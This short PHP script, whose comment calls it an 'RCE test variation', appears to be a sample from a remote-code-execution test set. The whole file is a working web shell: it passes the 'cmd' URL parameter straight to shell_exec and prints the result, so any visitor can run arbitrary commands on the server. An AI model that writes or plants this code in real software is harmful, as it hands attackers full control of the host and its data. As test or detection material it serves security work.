<?php
// RCE test variation #588
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>